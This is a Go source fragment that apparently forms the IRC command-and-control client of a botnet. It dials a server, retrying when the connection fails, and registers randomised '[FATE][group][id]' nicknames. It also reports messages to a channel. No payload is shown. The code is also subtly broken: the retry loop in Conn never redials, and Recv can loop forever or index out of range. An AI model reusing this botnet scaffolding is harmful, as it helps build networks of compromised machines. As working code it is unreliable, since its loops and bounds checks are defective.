package pkg

import (
	"fmt"
	"math/rand"
	"net"
	"strings"
	"time"
)

func Conn(server string) net.Conn {
	conn, err := net.Dial("tcp", server)
	for err != nil {
		time.Sleep(10 * time.Second)
		continue
	}
	return conn
}

func Recv(comd string, arg int) string {
	for {
		recv := strings.Split(comd, " ")
		if len(recv) == arg {
			continue
		}
		return recv[arg]
	}
}

func Find(read, msg string) bool {
	return strings.Contains(read, msg)
}

func name(alphabet rune) string {
	return string(alphabet + rune(rand.Intn(26)))
}

func (bot *BOT) Send(data string) {
	fmt.Fprintf(bot.IRC, "%s\r\n", data)
}

func (bot *BOT) Report(msg string) {
	bot.Send("PRIVMSG " + bot.Channel + " " + " :" + msg)
}

func (bot *BOT) Login() {
	rand.Seed(time.Now().UnixNano())
	id := rand.Intn(10000000)
	group := name('A')

	user := fmt.Sprint("USER [FATE][", group, "][", id, "]", " 8 * :bot")
	nick := fmt.Sprint("NICK [FATE][", group, "][", id, "]")

	bot.Send(user)
	bot.Send(nick)
}
